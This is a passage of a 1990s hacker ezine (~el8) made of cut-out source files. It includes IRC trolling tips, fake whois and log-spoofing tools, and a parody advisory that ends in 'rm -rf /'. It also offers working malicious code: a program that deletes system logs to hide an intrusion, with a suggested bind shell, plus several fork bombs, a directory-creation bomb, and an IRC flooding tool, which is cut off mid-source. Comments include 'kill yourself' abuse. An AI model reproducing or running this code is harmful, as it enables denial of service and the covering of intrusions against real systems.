	BONUS METHOD(1) "Jibberish" APPROACH!

	<schooler> Come on kid, what's a register?

	I often contemplated leaving bonus methods out, because my own
		secret methods would be revealed, but hey, here it is.

	The jibberish method is pretty effective, it is wide to change.

	<schooled> COMO QUE LA MOVETA TOSO JEE WA LEMAR

	The trick is, too sound like an imigrant, to your assailent, and well,
		here's a possible response.

	<schooler> Fuck this irc sux
	
	*** schooler has quit < lame > ***

	<schooled> Hah Owned
	[the Hah Owned earns you brownie points amongst your hacker-peers]

	pseudo:
	<schooled> <wtfamityping?!>


	BONUS METHOD(2) "Ignore" APPROACH!

	<schooler> Well, answer?

	This is simple, i willn't go over it in detail.

	<schooled> is schooler still being lame? he/she is on ignore
	[Makes you look bigger]

	pseudo:
	<schooled> [is blah la?] schooler is ignored



	Ok! There you have it! IT'S DONE!

	S1LLYG00S3 -- To help the scene one lamer at a time.

	CYA	

[END_CUT] school.HOWTO
[CUT_HERE] fakewhois.c
/* Added To The IRC Schooling Article */
// by matt ( kode shamenz )
/*--------------- --  -
  | kesha (k@de.kode.kodeshamenz.com) (Internic Commercial)
   ircname  : * I'm to lame to read px25.RFC *
  | channels : @#phrack @#FEH @#!/bin/sh @#idlers +#us-opers
   server   : irc.lightning.net ([207.45.69.69] Cataclysmic and Prolific)*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* standardish bxish */
#define OPER     "| operator : %s  (is NOT an IRC warrior)\n"

/* add more if you like */
/* BX Mode only (do others use this?) */
#define DOT_COM  "Internic Commercial"
#define DOT_NET  "Internic Network"
#define DOT_EDU  "Educational Institution"
#define DOT_ORG  "Internic Non-Profit Organization"
#define DOT_GOV  "Government"
#define DOT_MIL  "Military"
#define DOT_DEF  "unknown" // Default

#define NICK_MAX     (char*) malloc ((10)        * sizeof (char)) // standard + 1
#define IDENT_MAX    (char*) malloc ((15)        * sizeof (char))
#define HOST_MAX     (char*) malloc ((255)       * sizeof (char))
#define REALNAME_MAX (char*) malloc ((80)        * sizeof (char))
#define CHAN_MAX     (char*) malloc ((255)       * sizeof (char))
#define SERVER_MAX   (char*) malloc ((255 + 255) * sizeof (char))
#define MAX_MAX      (10 + 15 + 255 + 80 + 255 + (255 + 255) +10) // math iz for
                                                                  // h03z

/* BitchX */
#define BitchX 1
char whoisBitchX[] = "--------------- --  -\n"\
                     "| %s (%s@%s) (%s)\n"\
                     " ircname  : %s\n"\
                     "| channels : %s\n"\
                     " server   : %s\n";
/* ircii-EPIC */
#define EPIC 2
char whoisEPIC[]  = "*** %s is %s@%s (%s)\n"\
                    "*** on channels: %s\n"\
                    "*** on irc via server %s\n";
/* Ninja-IRC */
#define NINJA 3
char whoisNINJA[] = "!\\! %s is %s@%s \"%s\"\n"\
                    "!\\! on channel: %s\n"\
                    "!\\! on irc via server %s\n";
/* dont worry, just declaring */
char *Nick;
char *Ident;
char *Host;
char *Realname;
char *Chan;
char *Server;

int  verboze       = 0;
int  op3r          = 0;
char oper    [50 + 10];
char *           argv0;
extern char *   optarg;


#define MAX_SERV 6

char *unet[]=
{
"NewYork.NY.US.Undernet.Org (NYC Undernet Server - www.nac.net)",
"NewBrunswick.NJ.US.Undernet.Org ([204.127.145.17] AT&T WorldNet IRC Chat Services)",
"Arlington.VA.US.Undernet.Org ([207.96.122.250] Erols Internet Services')",
"atlanta.ga.us.undernet.org ([207.69.200.131] MindSpring Enterprises, Inc)",
"washington.dc.us.undernet.org ([205.188.149.3] AOL Public Client Server)",
"Baltimore.MD.US.Undernet.Org ([207.114.4.35] [undernet.abs.net] ABSnet's Undernet)"
};

char *efnet[]=
{
"irc.core.com ([208.133.73.83] Segmentation fault (core dumped))",
"irc.lightning.net ([207.45.69.69] Cataclysmic and Prolific)",
"irc.freei.net ([209.162.144.11] Freei Networks - Seattle, WA)",
"ircd.lagged.org ([199.3.235.130] Powered By SHOUTcast)",
"irc.cs.cmu.edu ([128.2.220.250] calloc(1,sizeof(geek)))",
"irc-roc.frontiernet.net (Yo Quiero Taco Bell)"
};


char *getDOM(char *);
char *makewhois(int);
int  checkargs(void);
void     usage(void);

void verbose(char *msg)
{
  if (verboze>0)
     fputs(msg,stderr);
  else
     return;
}

char *getDOM(char *fullhostname)
{
  char *DOMname = (char *) NULL;
  DOMname = strrchr(fullhostname,'.');
  if (DOMname == (char *) NULL)
      return (char *) NULL;
  if (!strncmp(DOMname,".com",4))
      return DOT_COM;
  else
  if (!strncmp(DOMname,".net",4))
      return DOT_NET;
  else
  if (!strncmp(DOMname,".org",4))
      return DOT_ORG;
  else
  if (!strncmp(DOMname,".edu",4))
      return DOT_EDU;
  else
  if (!strncmp(DOMname,".gov",4))
      return DOT_GOV;
  else
  if (!strncmp(DOMname,".mil",4))
      return DOT_MIL;
  else {
      verbose("getDOM() returning Default\n");
      return DOT_DEF;
  }
}

char *makewhois(int type)
{
  char *WHOIS = (char *) malloc( MAX_MAX * (sizeof (char)) + 1);
  switch (type)
  {

    case BitchX:
      snprintf(WHOIS,MAX_MAX,whoisBitchX,
               Nick,
               Ident,
               Host,
               getDOM(Host),
               Realname,
               Chan,
               Server);
      if (op3r!=0) {
          sprintf(oper,OPER,Nick);
          strcat(WHOIS,oper);
      }
      verbose("Whois'ing BitchX style.\n");
      return WHOIS;

    case EPIC:
      snprintf(WHOIS,MAX_MAX,whoisEPIC,
               Nick,
               Ident,
               Host,
               Realname,
               Chan,
               Server);
      verbose("Whois'ing EPIC style.\n");
      return WHOIS;

    case NINJA:
      snprintf(WHOIS,MAX_MAX,whoisNINJA,
               Nick,
               Ident,
               Host,
               Realname,
               Chan,
               Server);
      verbose("Whois'ing Ninja-IRC style.\n");
      return WHOIS;

    default:
      fprintf(stderr,"Unknown Whois Format! [%i]\n",type);
      usage();
  }
  exit(-1);
}
int checkargs(void)
{
  if (Nick == (char *) NULL)
  {
    fprintf(stderr,"No Nick!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Nick: %s",Nick);

  if (Ident == (char *) NULL)
  {
    fprintf(stderr,"No Ident!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Ident: %s",Ident);

  if (Host == (char *) NULL)
  {
    fprintf(stderr,"No Host!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Host: %s",Host);

  if (Realname == (char *) NULL)
  {
    fprintf(stderr,"No Realname!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Realname: %s",Realname);

  if (Chan == (char *) NULL)
  {
    fprintf(stderr,"No Channels!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Channels: %s",Chan);

  if (Server == (char *) NULL)
  {
    fprintf(stderr,"No Server!\n");
    usage();
  }
  else if (verboze>0) fprintf(stderr,"Server: %s",Server);

  verbose("passed checkargs.\n");
  return 1;
}
void usage(void)
{
  /* learn to use me */
  fprintf(stderr,
          "Fake Whois v0.1 by Matt Ashimoto for ~el8[0] -- 1998\n"
          "usage: %s [args]\n"
          "\t-n:\tNick\n"
          "\t-i:\tIdent\n"
          "\t-H:\tHost\n"
          "\t-r:\tRealname\n"
          "\t-c:\tChannels\n"
	  "\t-o:\tOper - show this person as an IRCOP [BX mode only]\n"
          "\t-s:\tServer [use \"efnet\" or \"unet\" for random ef/unet servers]\n"
          "\t-t:\tWhois Syntax Type [1 = BitchX, 2 = EPIC, 3 = Ninja-IRC, ...]\n"
          "\t-v:\tbe verbose\n"
	  "\nQuestions/Comments to: el8@press.co.jp SUBJECT: FakeWhois\n",
	  argv0);
  /* leave me be */
  exit(-1);
}

int main(int argc,char **argv)
{
  int c=0, whoistype=1;

  /* allocate globals */
  Nick          =         NICK_MAX;
  Ident         =        IDENT_MAX;
  Host          =         HOST_MAX;
  Realname      =     REALNAME_MAX;
  Chan          =         CHAN_MAX;
  Server        =       SERVER_MAX;

  /* set argv0 for usage() */
  argv0         =          argv[0];

  /* check for too leetle options */
  if (argc < 13) usage();

  /* parse options */
  while (EOF != (c = getopt(argc,argv,"n:i:H:r:c:s:t:vo")))
  {
     switch(c)
     {
       case 'n':
         Nick = optarg;
         break;
       case 'i':
         Ident = optarg;
         break;
       case 'H':
         Host = optarg;
         break;
       case 'r':
         Realname = optarg;
         break;
       case 'c':
         Chan = optarg;
         break;
       case 's':
         Server = optarg;
         break;
       case 't':
         whoistype = atoi(optarg);
         break;
       case 'v':
         verboze=1;
         break;
       case 'o':
         op3r=1;
         break;
       default:
         usage();
     }
  }


  /* random unet server */
  if (!strcmp(Server,"unet"))
  {
    srand(Nick); // this way, the same host will be used for the same nicks
    strcpy(Server,(unet[rand()%MAX_SERV]));  // blah blah, lower-order bitz
  }

  else
  /* random efnet server */
  if (!strcmp(Server,"efnet"))
  {
    srand(Nick);
    strcpy(Server,(efnet[rand()%MAX_SERV]));
  }

  /* make sure all values were specified */
  checkargs();

  /* make the whois / send it to stdout */
  fprintf(stdout,"%s",makewhois(whoistype));

  /* let forever be */
  return;

}
[END_CUT] fakewhois.c

heres another fake-IRC code by another staff member.
czech it out.
[CUT_HERE] log-spoof.c

#define VERSION .01
/* 1rc_l0g_sp00f.c by: un4namousanonymous */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define ARGC int argc
#define ARGV char **argv
#define eX(x) perror(x)
#define COMMENT '%'
#define MSGSIGN "MSG"
#define MESIGN "ME"
#define CTSIGN "CHAN"
#define CTCPSIGN "CTCP"
#define DEOPSIGN "DEOP"
#define OPSIGN "OP"
char MSGSYNTAX[520];
char MESYNTAX[520];
char CTSYNTAX[520];
char CTCPSYNTAX[520];
char DEOPSYNTAX[520];
char OPSYNTAX[520];

/* SYNTACTICAL WHARHEZR */

int
main (ARGC, ARGV)
{
  FILE *filp = (FILE *) NULL;
  char cbuff[1024];
  char tmpbuff[1024];
  char *code;
  char *text;
  char *t1 = (char *) NULL;
  char *t2 = (char *) NULL;
  char *t3 = (char *) NULL;
  char *t4 = (char *) NULL;

  if (argv[1] == '\0')
    {
      puts ("You RAN this PROGRAM slitely WRONG.");
      puts ("C0NSULT TH3 EXM4PLE C0NFIGUR3 F1LE F0R US4G3Z");
      puts ("msg;<field> <field>\nme;<field> <field>\nchan;<field> <field>\nctcp;<field> <field>\ndeop;<field> <field> <field>\nop;<field> <field> <field>");
      exit (-1);
    }
  if ((filp = fopen (argv[1], "r")) == NULL)
    {
      eX ("fopen()");
      exit (-1);
    }
  MSGSYNTAX[0] = '\0';
  MESYNTAX[0] = '\0';
  CTSYNTAX[0] = '\0';
  CTCPSYNTAX[0] = '\0';
  DEOPSYNTAX[0] = '\0';
  OPSYNTAX[0] = '\0';

  while (1)
    {

      bzero (&cbuff, sizeof cbuff);
      bzero (&tmpbuff, sizeof tmpbuff);

      if ((fgets) (cbuff, sizeof cbuff, filp) == NULL)
	break;

      if (cbuff[0] == COMMENT)
	continue;

      if (strncmp (cbuff, MSGSIGN, strlen (MSGSIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';

	  snprintf (tmpbuff, sizeof tmpbuff, "%s", &cbuff[strlen (MSGSIGN) + 1]);

	  if (MSGSYNTAX != NULL)
	    {
	      puts ("MSGSYNTAX != NULL");
	      bzero (&MSGSYNTAX, sizeof MSGSYNTAX);
	    }
	  snprintf (MSGSYNTAX, sizeof MSGSYNTAX, "%s", tmpbuff);

	  puts (MSGSYNTAX);
	  continue;
	}
      if (strncmp (cbuff, MESIGN, strlen (MESIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';
	  snprintf (tmpbuff, sizeof tmpbuff, "%s", &cbuff[strlen (MESIGN) + 1]);

	  if (MESYNTAX != NULL)
	    {
	      puts ("MESYNTAX != NULL");
	      bzero (&MESYNTAX, sizeof MESYNTAX);
	    }
	  snprintf (MESYNTAX, sizeof MESYNTAX, "%s", tmpbuff);

	  puts (MESYNTAX);
	  continue;
	}
      if (strncmp (cbuff, CTSIGN, strlen (CTSIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';
	  snprintf (tmpbuff, sizeof tmpbuff, "%s", &cbuff[strlen (CTSIGN) + 1]);
	  if (CTSYNTAX != NULL)
	    {
	      puts ("CTSYNTAX != NULL");
	      bzero (&CTSYNTAX, sizeof CTSYNTAX);
	    }
	  snprintf (CTSYNTAX, sizeof CTSYNTAX, "%s", tmpbuff);

	  puts (CTSYNTAX);
	  continue;
	}
      if (strncmp (cbuff, CTCPSIGN, strlen (CTCPSIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';
	  snprintf (tmpbuff, sizeof tmpbuff, "%s", &cbuff[strlen (CTCPSIGN) + 1]);
	  if (CTCPSYNTAX != NULL)
	    {
	      puts ("CTCPSYNTAX != NULL");
	      bzero (&CTCPSYNTAX, sizeof CTCPSYNTAX);
	    }
	  snprintf (CTCPSYNTAX, sizeof CTCPSYNTAX, "%s", tmpbuff);
	  puts (CTCPSYNTAX);
	  continue;
	}
      if (strncmp (cbuff, DEOPSIGN, strlen (DEOPSIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';
	  snprintf (tmpbuff, sizeof (tmpbuff), "%s", &cbuff[strlen (DEOPSIGN) + 1]);
	  if (DEOPSYNTAX != NULL)
	    {
	      puts ("DEOPSYNTAX != NULL");
	      bzero (&DEOPSYNTAX, sizeof DEOPSYNTAX);
	    }
	  snprintf (DEOPSYNTAX, sizeof DEOPSYNTAX, "%s", tmpbuff);
	  puts (DEOPSYNTAX);
	  continue;
	}
      if (strncasecmp (cbuff, OPSIGN, strlen (OPSIGN)) == 0)
	{
	  if (cbuff[strlen (cbuff) - 1] == '\n')
	    cbuff[strlen (cbuff) - 1] = '\0';
	  snprintf (tmpbuff, sizeof (tmpbuff), "%s", &cbuff[strlen (OPSIGN) + 1]);
	  if (OPSYNTAX != NULL)
	    {
	      puts ("OPSYNTAX != NULL");
	      bzero (&OPSYNTAX, sizeof OPSYNTAX);
	    }
	  snprintf (OPSYNTAX, sizeof OPSYNTAX, "%s", tmpbuff);
	  puts (OPSYNTAX);
	  continue;
	}
    }

  puts ("wh4 w3 h4z s0 f4h!");
  puts (MSGSYNTAX);
  puts (MESYNTAX);
  puts (CTSYNTAX);
  puts (CTCPSYNTAX);
  puts (DEOPSYNTAX);
  puts (OPSYNTAX);
  puts ("th4tz wh4 w3 h4z s0 f4h!");

  while (1)
    {
      bzero (&cbuff, sizeof cbuff);

      read (1, cbuff, sizeof (cbuff));

      if ((t1 = strdup (cbuff)) == NULL)
	{
	  puts ("Error: strdup(!)");
	  continue;
	}
      code = strtok (t1, ";");
      text = strtok (NULL, "");

      if (text == NULL)
	{
	  puts ("syntactical error");
	  continue;
	}
      text[strlen (text) - 1] = '\0';

/* msg */
      if (strncasecmp (code, "msg", 3) == 0)
	{
	  bzero (&tmpbuff, sizeof tmpbuff);
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof tmpbuff, MSGSYNTAX, t2, t3);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
/* me */
      if (strncasecmp (code, "me", 2) == 0)
	{
	  bzero (&tmpbuff, sizeof tmpbuff);
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof tmpbuff, MESYNTAX, t2, t3);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
/* chan */
      if (strncasecmp (code, "chan", 2) == 0)
	{
	  bzero (&tmpbuff, sizeof tmpbuff);
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof tmpbuff, CTSYNTAX, t2, t3);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
/* ctcp */
      if (strncasecmp (code, "ctcp", 4) == 0)
	{
	  bzero (&tmpbuff, sizeof tmpbuff);
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof tmpbuff, CTCPSYNTAX, t2, t3);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
/* deop */
      if (strncasecmp (code, "deop", 4) == 0)
	{
	  bzero (&tmpbuff, sizeof (tmpbuff));
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, " ");
	  t4 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof (tmpbuff), DEOPSYNTAX, t2, t3, t4);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
/* op */
      if (strncasecmp (code, "op", 2) == 0)
	{
	  bzero (&tmpbuff, sizeof (tmpbuff));
	  t1 = strdup (text);
	  t2 = strtok (t1, " ");
	  t3 = strtok (NULL, " ");
	  t4 = strtok (NULL, "");
	  snprintf (tmpbuff, sizeof (tmpbuff), OPSYNTAX, t2, t3, t4);
	  printf ("%s\n", tmpbuff);
	  fflush (stdout);
	}
    }
  return 1;
}
[END_CUT] log-spoof.c
[CUT_HERE] conf
% VER=.01
%
% SAMPLE BITCHX TYPE CONFIGURE FILE FOR LOG-SPOOF
%
% \%s nick , \%s text
MSG=[msg(%s)] %s
% \%s nick , \%s text
ME=[ %s %s
% \%s nick , \%s text
CHAN=<%s> %s
% \%s nick , \%s ctcp
CTCP=[ctcp(%s)] %s
% \%s chan , \%s deopdnick , \%s yournick
DEOP= mode/%s [-o %s] by %s
% \%s chan , \%s opnick    , \%s yournick
OP= mode/%s [+o %s] by %s
[END_CUT] conf

[CUT_HERE] lamest_code_ever.c
/*
These are my comments:
1) If you ever release something so lame - kill yourself
2) if you are sultrix - kill yourself
3) if you know sultrix - kill yourself + sultrix
4) if you have even used this code - kill your family including yourself
5) if you read this - /msg sultrix lamest_code_ever.c!
	[ you can find him on efnet ]
Why i include this in the irc section? Well, simply change the nick to someone
	you hate and u4ea-dr0p it on irc.
*/
/*
This is a simple program to clean the logs on RedHat 5.1 systems.

By Sultrix - [ http://www.rootshell.com/ ]

To bind this program to a port you'll need to edit your /etc/services
and your /etc/inetd.conf also you will need to add the following line
to the program
        system("/bin/bash -i -login");

You'll also want to check /etc/syslog.conf for other log file locations
to add to the program prior to getting root access.

*/

main()
{
        system("/bin/rm /var/run/utmp");
        system("/bin/echo "" > /var/run/utmp");
        system("/bin/rm /var/log/wtmp");
        system("/bin/echo "" > /var/log/wtmp");
        system("/bin/rm /var/log/messages");
        system("/bin/echo "" > /var/log/messages");
        system("/bin/rm /var/log/secure");
        system("/bin/echo "" > /var/log/secure");
        system("/bin/rm /var/log/xferlog");
        system("/bin/echo "" > /var/log/xferlog");
        system("/bin/rm /var/log/httpd/access_log");
        system("/bin/echo "" > /var/log/httpd/access_log");
        system("/bin/rm /var/log/httpd/error_log");
        system("/bin/echo "" > /var/log/httpd/error_log");
        system("/usr/bin/killall -HUP syslogd");
        printf("Logs have been cleaned!\n");
        printf("syslogd restarted!\n");
}
[END_CUT] lamest_code_ever.c
[END_DIR] IRC

[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(012) ~EL8 ADVISORY contributed by hybr1d]
                                       +
------------------------------------------------------------------------------
                                       +

[BEGIN_DIR] ADVISORY
[CUT_HERE] el0-advisory.txt

//THIS WAS ADDED LAST MINUTE
//WE ARE ALWAYS ON THE TIP OF THE HACKER SCENE
//WE ARE BRINGING YOU THIS 0DAY INFO FREE OF CHARGE!

#include <sk1llz.h>

#define AUTHOR  "By SEAMANSAYMAN"
#define ALIAS   "hybrid"
#define DATE 	"1996 8/10/"
#define ART1KLE "Thwarting the Evil Hacker"

#undef PHRACK
#define PHRACK  "fuck you man"

#define WHYISUBMITTEDTO~EL8 "ok, first i submit to phrack, i include a 56 page"\
			    "rant on why i like little children, they say my"\
			    "article is good enough, BUT JUST BECAUSE OF MY"\
			    "harmless little rant, it gets turned down."


#define WHYIDIDNTINCLUDETHERANTIN~EL8 "my parents read ~el8.\a\a\a\a\a"

	Inteligence is key, keep this in mind. The government has a great
amount of security specialists doing research on hackers, and howto protect
there systems. I've come up with a great method, which is quite small and
simple, it's a MUST READ (grep "MUST READ" el8[0] < END FEDERAL AGENT HUMOR
--- HERE --- >).

[ The OVERVIEW ]

	In this new hacker-society, everything is at risk. Or is it?

[ The Plan ]

	Ok, a hacker picks your site...

	[ $ grep "vuln" mscan.log | head -n 1 i
	yourhost.co.jp is vuln to imapd attack@@#!@#@!#!@#!@#!@#!@#
	]

	A hacker checks if your host is there.

 	[ $ ping yourhost.co.jp
	ping reply
	]

	A hacker scans your system.

	[ $ nmap -sF -p 1-65500 yourhost.co.jp
	port 23 is open
	$ hell yes
	bash: hell yes not found
	]
	
	A hacker determines your os.

	[ $ nmap -O -p 23 yourhost.co.jp
	Remote os guess: Linux 2.0.36
	9.02 x -400123456.49393 positive.
	$ yes haha!!@@!#@! what a peice of cake
	haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
        haha!!@@!#@! what a peice of cake
	^C
	$
	]

	A hacker grabs imapd exploit from rootshell.

	[ ./gH-exploit_gr4b.sh www.rootshell.org imapd
	PUT IMAPD.C IN YOUR HOME DIR
	$ ls
	Exploits/ Code/ Hacking-Utils/ passwdfile jackripr.zip
	$ find / -name imapd.c
	/etc/imapd.c
	$ cp /etc/imapd.c ./
	$ cat howtocompileexploit.txt

	First you must gcc -o exploit exploit.c

	EOF

	$ gcc -o imapd imapd.c
	]

	A hacker runs it on you..........................................

	[ $ ./imapd yourhost.co.jp
	EXPLOIT WORKS!
	BASH# rm -rf / &
	]

[ The Solution ]

	Buy a 300 baud modem.

[END_CUT] el0-advisory.txt
[END_DIR] ADVISORY
[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(013) Anarchist Code Kit (ACK)]
                                       +
------------------------------------------------------------------------------
                                       +
cooler than rm -fr /
[pay attention gH]

BREIF DESCRIPTION -  THE ANARCHIST CODE KIT WILL BRING YOU THE LATEST
	"PLEASE DO NOT DISTRIBUTE KODES" W/O THE "PLEASE DO NOT
	DESTRIBUTE" HEADER. THIS IS 0DAY/DAY[0], SO, BE CAREFUL WITH WHAT
	YOU DO TO IT. FROM NOW ON, WHEN YOU SEE THE ANARCHIST CODE KIT -
	THINK "SERIES OFR DAY[0] CODES". THIS WILL BE AN ONGOING PROCESS.

HAVE FUN

-- S1LLYG00S3

THIS CONSIST OF TWO INGENIUS FORK BOMBS, AND A MKDIR BOMB.

[BEGIN_DIR] ACK
[CUT_HERE] f0rkb0mb.c
/* PART 1 OF THE ANARCHIST CODE KIT */
/* FORKBOMB.C -- S1LLYG00S3 */
#include <unistd.h>

int main()
{
if (!fork()) {
fork();
}
main();
}
[END_CUT] f0rkb0mb.c
[CUT_HERE] mkdirb0mb.c
/* PART 2 OF THE ANARCHIST CODE KIT */
/* MKDIRBOMB.C -- S1LLYG00S3 */
/* Usage is MKDIRBOMB directory msg
   msg is under 100 chars
 */
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

int main(int argc, char *argv[])
{
   time_t t1;
  time_t t2;
   int r1;
   int r2;
 char buff1[255];
  char buff2[255];
   int i1;
int i2;
   int fd1;
   int fd2;
  r1 = r2 = i1 = i2 = fd1 = fd2 = 0;
t1 = t2 = 0;

 if (argc != 3) {
     puts("RE4D JA USAG4 PEEZ!");
  exit(-1);
   }
if (strlen(argv[2]) >= 100) {
        puts("argv[2] -- too long!");
        exit(-1);
    }
 if (access(argv[1], F_OK) < 0) {
  puts("Could not access dir.");
    if (argv[1][0] != '/') {
       printf("Creating local dir %s\n", argv[1]);
    if (mkdir(argv[1], umask(777)) < 0) {
       perror("mkdir()");
       exit(-1);
       }
   } else
     exit(1);
 }
  chdir(argv[1]);

 if (!fork()) {
   chdir(argv[1]);
   for (;;) {
  bzero(&buff2, sizeof buff2);
   (void) time(&t2);
  r2 = rand();
  if (i2)
  snprintf(buff2, sizeof buff2, "%s%i%i", argv[2], t2, r2);
 else
  snprintf(buff2, sizeof buff2, "%s%i%i", argv[2], r2, t2);
 mkdir(buff2, umask(777));
chdir(buff2);
 fd1 = open("./S1LLYG00S3", O_CREAT | O_RDWR);
  if (fd1)
    close(fd1);
  i2 += 1;
  if (i2 == 3)
   i2 = 0;
   }
   }
   strncpy(buff1, argv[2], strlen(argv[2]));

 i1 = 0;

 for (;;) {
(void) time(&t1);
   r1 = rand();

       if (strlen(buff1) == 250) {
    bzero(&buff1, sizeof buff1);
   strncpy(buff1, argv[2], strlen(argv[2]));
  }
       strncat(buff1, "o", 1);

   mkdir(buff1, umask(777));
  chdir(buff1);
 }

 return 1;
}
[END_CUT] mkdirb0mb.c
[CUT_HERE] sig_fork.c
// lame code. this shouldnt be used by anyone.
// compiles on AIX/HPUX, others?
// - PercY

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

void sig(int s);
int main(void)
{
 register int i=0;
 for(i=0;i<63;i++) (void)signal(i,sig);
 /*
 signal(SIGHUP,sig); signal(SIGINT,sig); signal(SIGQUIT,sig); signal(SIGILL,sig);
 signal(SIGTRAP,sig); signal(SIGIOT,sig); signal(SIGBUS,sig); signal(SIGFPE,sig);
 signal(SIGKILL,sig); signal(SIGUSR1,sig); signal(SIGUSR2,sig); signal(SIGPIPE,sig);
 signal(SIGALRM,sig); signal(SIGTERM,sig); signal(SIGCHLD,sig); signal(SIGCONT,sig);
 signal(SIGSTOP,sig); signal(SIGTSTP,sig); signal(SIGTTIN,sig); signal(SIGTTOU,sig);
 signal(SIGURG,sig); signal(SIGXCPU,sig); signal(SIGXFSZ,sig); signal(SIGVTALRM,sig);
 signal(SIGPROF,sig); signal(SIGWINCH,sig); signal(SIGIO,sig); signal(SIGPWR,sig);
 signal(SIGSEGV,sig); + SIGJUNK's
 */
 for(;;);
          // lets just wait for some input, shall we?
          // just something nice an friendly
          // perhaps you can add something elite like raise(10);
          // or fcntl(stdout,F_SETFL,O_ASYNC);

}
void sig(int s)
{
  // we have the authority to kill a minority
  (void)signal(SIGCHLD,sig); // boom.
  if(!fork())                // wait until its too late.
  (void)fprintf(stderr,"fast as fast can be, you'll never catch me!\n");
  (void)malloc('A');
  (void)setsid();
}
[END_CUT] sig_fork.c
[END_DIR] ACK
[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(014) u4ea-dr0p by U4EA]
                                       +
------------------------------------------------------------------------------
                                       +


[BEGIN_DIR] dr0p-d0x
[CUT_HERE] u4ea-dr0p.c
/* uz4ge={ ./u4ea-dr0p 'file' 'lines' (per) 'second' 'serv(:port)'   'chan(:key)' }
   ./u4ea-dr0p bronclkm.c 5 5 irc.freei.net:6667 (\#)phrack
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <paths.h>
#include <fcntl.h>

#define USER "y00y blah@blah undernet :blah"
#define NICK "u4eadr0p"

extern int main (int argc, char **argv);

int
main (int argc, char **argv)
{

/* file lines timeout server:port chan:key */

  struct sockaddr_in andwhat;
  FILE *fp;
  int ca;
  char buff[200];
  int i, port, s, o;
  char *p0rt = (char *) NULL;
  char *h0st = (char *) NULL;
  char *argv4 = (char *) NULL;
  char *argv5 = (char *) NULL;
  char *chan = (char *) NULL;
  char *key = (char *) NULL;
  char mytempleofkodes[512];
  char feh[1024];
  char tempbUFF[255];

  ca = port = i = 0;

  if (argc != 6)
    {
      fprintf (stderr, "see src f()r us4gE, iF y()u d()n7 h4vE sr( g3t ~el8.\n");
      exit (-1);
    }
  argv4 = strdup (argv[4]);

  for (i = 0; i <= strlen (argv[4]); i++)
    {
      if (argv[4][i] == ':')
	{
	  h0st = strtok (argv4, ":");
	  p0rt = strtok (NULL, "");
	  port = atoi (p0rt);
	}
    }

  if (!h0st)
    h0st = strdup (argv[4]);

  printf ("%i\n", port);
  if (h0st)
    printf ("[hm %s]\n", h0st);

  argv5 = strdup (argv[5]);

  for (i = 0; i <= strlen (argv[5]); i++)
    {
      if (argv[5][i] == ':')
	{
	  chan = strtok (argv5, ":");
	  key = strtok (NULL, "");
	}
    }

  if (!chan)
    chan = strdup (argv[5]);

  printf ("%s %s\n", chan, key);

  if (argv[1][0] == '/' || argv[1][0] == '.')
    {
      if ((fp = fopen (argv[1], "r")) == NULL)
	{
	  perror ("fopen() ");
	  exit ((1 - 2));
	}
    }
  else
    {
      bzero (&tempbUFF, sizeof tempbUFF);
      snprintf (tempbUFF, sizeof tempbUFF,
		"%s/%s", _PATH_MAILDIR, argv[1]);
      if ((o = open (tempbUFF, O_RDONLY)))
	{
	  close (o);
	  if ((fp = fopen (tempbUFF, "r")) == NULL)
	    perror (" f o p ennnn () \"");
	  if (fp == NULL)
	    if ((fp = fopen (argv[1], "r")) == NULL)
	      {
		perror ("fopen() ");
		exit ((1 - 2));
	      }
	}
    }

  s = socket (AF_INET, SOCK_STREAM, 0);
  if (!s)
    {
      perror ("socket() ");
      exit (-1);
    }
  bzero (&andwhat, sizeof (struct sockaddr_in));
  andwhat.sin_family = AF_INET;
  andwhat.sin_port = port ? htons (port) : htons (6667);
  andwhat.sin_addr.s_addr = port ? inet_addr (h0st) : inet_addr (argv[4]);

